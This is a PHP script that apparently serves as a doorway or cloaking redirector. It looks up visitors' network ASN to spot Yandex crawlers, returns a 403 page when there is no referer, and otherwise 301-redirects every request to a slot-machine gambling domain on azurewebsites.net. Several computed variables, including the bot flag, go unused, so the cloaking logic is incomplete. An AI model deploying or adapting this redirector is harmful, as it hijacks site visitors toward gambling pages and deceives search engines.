<?php

require 'vendor/autoload.php';
require 'Mobile_Detect.php';

$maxmindReader = new \MaxMind\Db\Reader('GeoLite2-ASN.mmdb');
$detect = new Mobile_Detect;

$userIp = preg_replace('/[^\da-f.:]/', '', isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1');
$ASNArray = $maxmindReader->get($userIp);
$serverRequestUri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
$userIpASN = isset($ASNArray['autonomous_system_number'], $ASNArray['autonomous_system_organization']) ? ($ASNArray['autonomous_system_number'] . ' ' . $ASNArray['autonomous_system_organization']) : '';
$isSearchBot = (bool)((empty($_SERVER['REMOTE_ADDR']) or $_SERVER['REMOTE_ADDR'] === $userIp) and $userIpASN and preg_match('#(yandex)#i', $userIpASN));
$serverHttpHost = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$user_agent = (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null);
$app_engine = ( isset($_SERVER['HTTP_APP_ENGINE']) ? $_SERVER['HTTP_APP_ENGINE'] : false );
$user_referer = ( isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : false );

if ($isSearchBot and stripos($userIpASN, 'Google Fiber') !== false) {
    $isSearchBot = false;
}

$redirectDomain = 'igrovye-avtomaty.azurewebsites.net';

$yandexPos = stripos($user_referer, 'yandex');
$sitePos = stripos($user_referer, $redirectDomain);
if ( !$user_referer ){
    include_once '403.php';
    exit();
}

header('Location: https://'.$redirectDomain.$serverRequestUri, true, 301);
exit;